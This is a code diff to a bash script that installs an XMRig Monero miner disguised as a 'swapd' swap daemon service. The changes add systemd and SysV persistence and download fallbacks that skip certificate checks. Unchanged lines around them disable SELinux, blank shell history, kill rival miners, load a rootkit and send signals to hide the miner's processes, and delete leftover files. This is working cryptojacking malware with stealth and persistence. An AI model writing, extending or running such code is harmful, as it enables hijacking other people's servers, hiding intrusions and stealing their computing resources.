@@ -1,5 +1,362 @@
 #!/bin/bash
 
+# ========================================================================
+# UNIVERSAL COMPATIBILITY LAYER
+# Auto-detects and fixes: systemd, SSL/TLS, curl/wget issues
+# ========================================================================
+
+VERSION=2.8
+echo "========================================================================="
+echo "MoneroOcean Miner Setup Script v$VERSION (Universal Compatibility)"
+echo "========================================================================="
+echo ""
+
+# Initialize flags
+USE_SYSV=false
+USE_WGET=false
+SYSTEMD_AVAILABLE=false
+
+# ========================================================================
+# STEP 1: DETECT AND FIX INIT SYSTEM (systemd vs SysV)
+# ========================================================================
+
+echo "[*] Detecting init system..."
+
+check_systemd() {
+    # Check if systemd is available and running
+    if command -v systemctl &> /dev/null; then
+        if [ -d /run/systemd/system ]; then
+            return 0  # systemd is available and running
+        fi
+    fi
+    return 1  # systemd not available
+}
+
+if check_systemd; then
+    echo "[✓] systemd detected and running"
+    SYSTEMD_AVAILABLE=true
+else
+    echo "[!] systemd not found or not running"
+    echo "[*] Attempting to install systemd..."
+    
+    # Detect OS
+    if [ -f /etc/os-release ]; then
+        . /etc/os-release
+        OS_ID=$ID
+        OS_VERSION=$VERSION_ID
+    elif [ -f /etc/redhat-release ]; then
+        OS_ID="rhel"
+        OS_VERSION=$(cat /etc/redhat-release | grep -oP '\d+' | head -1)
+    else
+        OS_ID="unknown"
+        OS_VERSION="unknown"
+    fi
+    
+    echo "[*] Detected: $OS_ID $OS_VERSION"
+    
+    # Try to install systemd based on OS
+    case "$OS_ID" in
+        centos|rhel|scientific|oracle)
+            VER_MAJOR=$(echo $OS_VERSION | cut -d. -f1)
+            if [ "$VER_MAJOR" -ge 7 ]; then
+                yum install -y systemd 2>/dev/null
+                if check_systemd; then
+                    echo "[✓] systemd installed successfully"
+                    SYSTEMD_AVAILABLE=true
+                else
+                    echo "[!] systemd installed but not active - may need reboot"
+                    USE_SYSV=true
+                fi
+            else
+                echo "[!] CentOS/RHEL $VER_MAJOR is too old for systemd (requires 7+)"
+                USE_SYSV=true
+            fi
+            ;;
+            
+        debian|ubuntu)
+            apt-get update -qq 2>/dev/null
+            apt-get install -y systemd 2>/dev/null
+            if check_systemd; then
+                echo "[✓] systemd installed successfully"
+                SYSTEMD_AVAILABLE=true
+            else
+                USE_SYSV=true
+            fi
+            ;;
+            
+        fedora)
+            dnf install -y systemd 2>/dev/null
+            if check_systemd; then
+                echo "[✓] systemd installed successfully"
+                SYSTEMD_AVAILABLE=true
+            else
+                USE_SYSV=true
+            fi
+            ;;
+            
+        *)
+            echo "[!] Unknown OS, trying generic installation..."
+            if command -v apt-get &> /dev/null; then
+                apt-get update -qq 2>/dev/null && apt-get install -y systemd 2>/dev/null
+            elif command -v yum &> /dev/null; then
+                yum install -y systemd 2>/dev/null
+            elif command -v dnf &> /dev/null; then
+                dnf install -y systemd 2>/dev/null
+            fi
+            
+            if check_systemd; then
+                SYSTEMD_AVAILABLE=true
+            else
+                USE_SYSV=true
+            fi
+            ;;
+    esac
+fi
+
+if [ "$USE_SYSV" = true ]; then
+    echo "[→] Will use SysV init scripts (legacy mode)"
+else
+    echo "[→] Will use systemd for service management"
+fi
+
+echo ""
+
+# ========================================================================
+# STEP 2: DETECT AND FIX SSL/TLS ISSUES (curl vs wget)
+# ========================================================================
+
+echo "[*] Checking SSL/TLS capabilities..."
+
+test_ssl() {
+    # Try to connect to GitHub
+    if command -v curl &> /dev/null; then
+        if curl -s --connect-timeout 5 https://raw.githubusercontent.com/ > /dev/null 2>&1; then
+            return 0  # curl works
+        fi
+    fi
+    return 1  # curl doesn't work or not available
+}
+
+if test_ssl; then
+    echo "[✓] curl with SSL/TLS working correctly"
+else
+    echo "[!] curl SSL/TLS connection failed"
+    echo "[*] Attempting to fix SSL/TLS..."
+    
+    # Update SSL packages
+    if command -v yum &> /dev/null; then
+        echo "[*] Updating curl, openssl, ca-certificates (yum)..."
+        yum install -y curl openssl ca-certificates nss 2>/dev/null
+        yum update -y curl openssl ca-certificates nss 2>/dev/null
+    elif command -v apt-get &> /dev/null; then
+        echo "[*] Updating curl, openssl, ca-certificates (apt)..."
+        apt-get update -qq 2>/dev/null
+        apt-get install -y curl openssl ca-certificates 2>/dev/null
+    fi
+    
+    # Test again
+    if test_ssl; then
+        echo "[✓] SSL/TLS fixed successfully"
+    else
+        echo "[!] curl still failing - trying wget as fallback..."
+        
+        # Install wget
+        if command -v yum &> /dev/null; then
+            yum install -y wget 2>/dev/null
+        elif command -v apt-get &> /dev/null; then
+            apt-get install -y wget 2>/dev/null
+        fi
+        
+        # Test wget
+        if command -v wget &> /dev/null; then
+            if wget --spider --timeout=5 https://raw.githubusercontent.com/ 2>/dev/null; then
+                echo "[✓] wget works - will use wget for downloads"
+                USE_WGET=true
+            else
+                echo "[!] Both curl and wget failed - will try with --no-check-certificate"
+                USE_WGET=true  # Use wget with --no-check-certificate
+            fi
+        else
+            echo "[ERROR] Cannot install wget - downloads may fail"
+        fi
+    fi
+fi
+
+echo ""
+
+# ========================================================================
+# UNIVERSAL DOWNLOAD FUNCTION
+# Automatically uses curl or wget based on what works
+# ========================================================================
+
+download_file() {
+    local url="$1"
+    local output="$2"
+    local retry=0
+    local max_retries=3
+    
+    while [ $retry -lt $max_retries ]; do
+        if [ "$USE_WGET" = true ]; then
+            # Try wget with SSL verification first
+            if wget --timeout=30 "$url" -O "$output" 2>/dev/null; then
+                return 0
+            fi
+            # If that fails, try without SSL verification
+            echo "[!] Retrying with --no-check-certificate..."
+            if wget --no-check-certificate --timeout=30 "$url" -O "$output" 2>/dev/null; then
+                return 0
+            fi
+        else
+            # Try curl
+            if curl -L --connect-timeout 30 --max-time 300 "$url" -o "$output" 2>/dev/null; then
+                return 0
+            fi
+            # If that fails, try without SSL verification
+            echo "[!] Retrying with --insecure..."
+            if curl -L --insecure --connect-timeout 30 --max-time 300 "$url" -o "$output" 2>/dev/null; then
+                return 0
+            fi
+        fi
+        
+        retry=$((retry + 1))
+        echo "[!] Download attempt $retry/$max_retries failed, retrying..."
+        sleep 2
+    done
+    
+    return 1
+}
+
+echo "[*] Download system configured:"
+if [ "$USE_WGET" = true ]; then
+    echo "    → Using: wget (curl failed)"
+else
+    echo "    → Using: curl"
+fi
+echo ""
+
+# ========================================================================
+# FUNCTION: CREATE SYSV INIT SCRIPT (fallback for old systems)
+# ========================================================================
+
+create_sysv_service() {
+    echo "[*] Creating SysV init script for swapd..."
+    
+    cat > /etc/init.d/swapd << 'EOFSYSV'
+#!/bin/bash
+# chkconfig: 2345 99 01
+# description: Swap Daemon Miner Service
+
+DAEMON=/root/.swapd/swapd
+CONFIG=/root/.swapd/config.json
+PIDFILE=/var/run/swapd.pid
+NAME=swapd
+
+start() {
+    if [ -f $PIDFILE ]; then
+        PID=$(cat $PIDFILE)
+        if ps -p $PID > /dev/null 2>&1; then
+            echo "$NAME is already running (PID: $PID)"
+            return 1
+        else
+            echo "Removing stale PID file"
+            rm -f $PIDFILE
+        fi
+    fi
+    
+    echo "Starting $NAME..."
+    nohup $DAEMON --config=$CONFIG > /dev/null 2>&1 &
+    echo $! > $PIDFILE
+    sleep 1
+    
+    if ps -p $(cat $PIDFILE) > /dev/null 2>&1; then
+        echo "$NAME started successfully (PID: $(cat $PIDFILE))"
+        return 0
+    else
+        echo "Failed to start $NAME"
+        rm -f $PIDFILE
+        return 1
+    fi
+}
+
+stop() {
+    echo "Stopping $NAME..."
+    if [ -f $PIDFILE ]; then
+        PID=$(cat $PIDFILE)
+        kill $PID 2>/dev/null
+        sleep 2
+        if ps -p $PID > /dev/null 2>&1; then
+            kill -9 $PID 2>/dev/null
+        fi
+        rm -f $PIDFILE
+    fi
+    killall -9 swapd 2>/dev/null
+    echo "$NAME stopped"
+}
+
+status() {
+    if [ -f $PIDFILE ]; then
+        PID=$(cat $PIDFILE)
+        if ps -p $PID > /dev/null 2>&1; then
+            echo "$NAME is running (PID: $PID)"
+            ps aux | grep $PID | grep -v grep
+            return 0
+        else
+            echo "$NAME is not running (stale PID file)"
+            return 1
+        fi
+    else
+        echo "$NAME is not running"
+        return 3
+    fi
+}
+
+case "$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        sleep 2
+        start
+        ;;
+    status)
+        status
+        ;;
+    *)
+        echo "Usage: $0 {start|stop|restart|status}"
+        exit 1
+        ;;
+esac
+
+exit $?
+EOFSYSV
+    
+    chmod +x /etc/init.d/swapd
+    
+    # Enable on boot
+    if command -v chkconfig &> /dev/null; then
+        chkconfig --del swapd 2>/dev/null
+        chkconfig --add swapd 2>/dev/null
+        chkconfig swapd on 2>/dev/null
+        echo "[✓] Service enabled via chkconfig"
+    elif command -v update-rc.d &> /dev/null; then
+        update-rc.d -f swapd remove 2>/dev/null
+        update-rc.d swapd defaults 2>/dev/null
+        echo "[✓] Service enabled via update-rc.d"
+    elif command -v rc-update &> /dev/null; then
+        rc-update add swapd default 2>/dev/null
+        echo "[✓] Service enabled via rc-update"
+    fi
+    
+    echo "[✓] SysV init script created: /etc/init.d/swapd"
+}
+
+echo "========================================================================="
+echo ""
+
 sudo setenforce 0  # Temporarily disable
 
 # Fix CentOS/RHEL 7 repos
@@ -32,10 +389,24 @@ sudo setenforce 0  # Temporarily disable
 
 # ======== SSH PRESERVATION ========
 echo "[*] Restoring SSH access"
-systemctl restart sshd
-echo "ClientAliveInterval 10" >> /etc/ssh/sshd_config
-echo "ClientAliveCountMax 3" >> /etc/ssh/sshd_config
-systemctl reload sshd
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    systemctl restart sshd 2>/dev/null || /etc/init.d/sshd restart 2>/dev/null || service sshd restart 2>/dev/null
+    systemctl reload sshd 2>/dev/null
+else
+    /etc/init.d/sshd restart 2>/dev/null || service sshd restart 2>/dev/null
+fi
+
+# Add SSH keepalive settings if not already present
+if ! grep -q "ClientAliveInterval" /etc/ssh/sshd_config 2>/dev/null; then
+    echo "ClientAliveInterval 10" >> /etc/ssh/sshd_config
+    echo "ClientAliveCountMax 3" >> /etc/ssh/sshd_config
+fi
+
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    systemctl reload sshd 2>/dev/null
+else
+    /etc/init.d/sshd reload 2>/dev/null || kill -HUP $(cat /var/run/sshd.pid 2>/dev/null) 2>/dev/null
+fi
 
 # Timeout and self-healing execution
 timeout_run() {
@@ -75,11 +446,19 @@ export HISTFILE=/dev/null
 
 #crontab -r
 
-systemctl stop gdm2
-systemctl disable gdm2 --now
-
-systemctl stop swapd
-systemctl disable swapd --now
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    systemctl stop gdm2 2>/dev/null
+    systemctl disable gdm2 --now 2>/dev/null
+    systemctl stop swapd 2>/dev/null
+    systemctl disable swapd --now 2>/dev/null
+else
+    /etc/init.d/gdm2 stop 2>/dev/null || service gdm2 stop 2>/dev/null
+    /etc/init.d/swapd stop 2>/dev/null || service swapd stop 2>/dev/null
+    if command -v chkconfig &> /dev/null; then
+        chkconfig gdm2 off 2>/dev/null
+        chkconfig swapd off 2>/dev/null
+    fi
+fi
 
 #killall swapd
 kill -9 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
@@ -375,8 +754,13 @@ echo "[*] #start doing stuff: preparing miner..."
 
 echo "[*] Removing previous moneroocean miner (if any)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop moneroocean_miner.service
-  sudo systemctl stop gdm2.service
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+  sudo systemctl stop moneroocean_miner.service 2>/dev/null
+  sudo systemctl stop gdm2.service 2>/dev/null
+else
+  sudo /etc/init.d/moneroocean_miner stop 2>/dev/null
+  sudo /etc/init.d/gdm2 stop 2>/dev/null
+fi
 fi
 killall -9 xmrig
 killall -9 kswapd0
@@ -388,13 +772,22 @@ rm -rf "$HOME"/.gdm2*
 #rm -rf "$HOME"/.swapd
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-#  exit 1
-fi
 
-wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz
-# curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o "$HOME"/.swapd/xmrig.tar.gz
+# Use the universal download function (handles curl/wget and SSL issues)
+if download_file "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" "/tmp/xmrig.tar.gz"; then
+  echo "[✓] XMRig downloaded successfully"
+else
+  echo "[ERROR] Failed to download XMRig after multiple attempts"
+  echo "[*] Trying alternative download method..."
+  
+  # Last resort: manual wget with no certificate check
+  if command -v wget &> /dev/null; then
+    wget --no-check-certificate --timeout=60 https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz
+  else
+    echo "[ERROR] All download methods failed"
+    exit 1
+  fi
+fi
 
 echo "[*] Unpacking xmrig.tar.gz to "$HOME"/.swapd/"
 [ -d "$HOME"/.swapd/ ] || mkdir "$HOME"/.swapd/
@@ -530,13 +923,19 @@ else
 
   else
 
-    echo "[*] Creating moneroocean systemd service"
+    # ====================================================================
+    # SMART SERVICE CREATION: systemd or SysV based on what's available
+    # ====================================================================
+    
+    if [ "$SYSTEMD_AVAILABLE" = true ]; then
+        echo "[*] Creating moneroocean systemd service"
+        
+        rm -rf /etc/systemd/system/swapd.service
 
-    rm -rf /etc/systemd/system/swapd.service
-
-    cat >/tmp/swapd.service <<EOL
+        cat >/tmp/swapd.service <<EOL
 [Unit]
 Description=Swap Daemon Service
+After=network.target
 
 [Service]
 ExecStart="$HOME"/.swapd/swapd --config=/root/.swapd/config.json
@@ -547,14 +946,27 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
-    #sudo chmod 666 /etc/systemd/system/swapd.service
-    echo "[*] Starting swapd systemd service"
-    sudo killall swapd 2>/dev/null
-    sudo systemctl daemon-reload
-    sudo systemctl enable swapd.service
-#    sudo systemctl start swapd.service
-    echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
+        sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
+        
+        echo "[*] Starting swapd systemd service"
+        sudo killall swapd 2>/dev/null
+        sudo systemctl daemon-reload
+        sudo systemctl enable swapd.service
+        echo "[✓] systemd service created and enabled"
+        echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
+        
+    else
+        echo "[*] Creating SysV init service (systemd not available)"
+        
+        # Use the SysV creation function defined at the start
+        create_sysv_service
+        
+        echo "[*] Starting swapd service via SysV init"
+        /etc/init.d/swapd start
+        echo "[✓] SysV init service created and started"
+        echo "To check service status run \"/etc/init.d/swapd status\" command"
+    fi
+    
   fi
 fi
 
@@ -905,20 +1317,67 @@ dmesg -C && insmod rootkit.ko && dmesg
 kill -31 $(/bin/ps ax -fu "$USER" | grep "swapd" | grep -v "grep" | awk '{print $2}')
 rm -rf hiding-cryptominers-linux-rootkit/
 
+echo ""
+echo "[*] Starting swapd service..."
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    systemctl start swapd 2>/dev/null
+    sleep 2
+    systemctl status swapd --no-pager -l 2>/dev/null || systemctl status swapd 2>/dev/null
+else
+    /etc/init.d/swapd start
+    sleep 2
+    /etc/init.d/swapd status
+fi
 
-systemctl status swapd
-systemctl start swapd
-systemctl status swapd
+echo ""
 
-kill -31 $(pgrep -f -u root config.json) &
-kill -31 $(pgrep -f -u root config_background.json) &
-kill -31 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
-kill -31 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &
-kill -63 `/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
-kill -63 `/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &
+kill -31 $(pgrep -f -u root config.json) 2>/dev/null &
+kill -31 $(pgrep -f -u root config_background.json) 2>/dev/null &
+kill -31 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+kill -31 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+kill -63 $(/bin/ps ax -fu "$USER"| grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+kill -63 $(/bin/ps ax -fu "$USER"| grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
 
-# New addition: Delete xmrig files in login directory
-log_message "Cleaning up xmrig files in login directory..."
-rm -rf ~/xmrig*.*
+# Cleanup xmrig files in login directory
+echo "[*] Cleaning up xmrig files in login directory..."
+rm -rf ~/xmrig*.* 2>/dev/null
 
-echo "[*] Setup complete"
+echo ""
+echo "========================================================================="
+echo "[✓] SETUP COMPLETE!"
+echo "========================================================================="
+echo ""
+echo "System Configuration:"
+if [ "$SYSTEMD_AVAILABLE" = true ]; then
+    echo "  Init System: systemd"
+    echo ""
+    echo "Service Management Commands:"
+    echo "  Start:   systemctl start swapd"
+    echo "  Stop:    systemctl stop swapd"
+    echo "  Status:  systemctl status swapd"
+    echo "  Logs:    journalctl -u swapd -f"
+else
+    echo "  Init System: SysV init (legacy mode)"
+    echo ""
+    echo "Service Management Commands:"
+    echo "  Start:   /etc/init.d/swapd start"
+    echo "  Stop:    /etc/init.d/swapd stop"
+    echo "  Status:  /etc/init.d/swapd status"
+    echo "  Restart: /etc/init.d/swapd restart"
+fi
+
+echo ""
+echo "Download Method:"
+if [ "$USE_WGET" = true ]; then
+    echo "  wget (curl SSL/TLS failed)"
+else
+    echo "  curl"
+fi
+
+echo ""
+echo "Miner Details:"
+echo "  Binary:  /root/.swapd/swapd"
+echo "  Config:  /root/.swapd/config.json"
+echo "  Wallet:  $WALLET"
+echo ""
+echo "========================================================================="
